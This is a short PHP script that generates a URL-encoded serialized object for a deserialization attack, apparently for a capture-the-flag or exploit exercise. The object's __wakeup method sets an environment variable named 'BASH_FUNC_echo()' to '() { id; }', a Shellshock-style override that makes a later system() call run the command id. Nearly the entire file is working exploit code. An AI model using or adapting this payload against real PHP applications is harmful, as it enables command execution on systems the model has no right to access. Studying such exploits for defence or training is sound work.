<?php

    class Greeting {
        private $info = array("name" => "GreyCat", "BASH_FUNC_echo()" => "() { id; }");

        public function __wakeup() {
            foreach ($this->info as $key => $value) {
                echo $key."->".$value."\n";
                putenv("{$key}={$value}");
            }
        }

        public function sayHi() {
            system('echo Hello, $name');
        }

    }

    $tmp = new Greeting;
    echo urlencode(serialize($tmp))."\n";

?>
